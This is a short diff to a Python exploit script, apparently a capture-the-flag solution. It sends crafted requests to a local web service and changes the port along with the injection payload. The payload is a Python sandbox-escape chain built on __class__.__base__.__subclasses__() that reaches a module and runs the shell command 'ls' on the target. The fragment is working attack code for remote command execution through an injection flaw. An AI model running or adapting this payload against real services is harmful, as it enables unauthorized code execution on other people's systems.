@@ -6,7 +6,7 @@ import requests
 import re
 
 def send(command):
-    url = 'http://0.0.0.0:10102/docs/'
+    url = 'http://0.0.0.0:10002/docs/'
     resp = requests.get(url + command)
 
     if resp.status_code == 200:
@@ -84,7 +84,7 @@ def execute(command, action):
 
 
 char = ascii_lowercase + digits + '\n_(),=:'
-cmd  = craft("().__class__.__base__.__subclasses__.()")
+cmd  = "''" + craft("__class__.__base__.__subclasses__.()")
 cmd  = get_module(cmd)
 
 execute(cmd, 'ls')
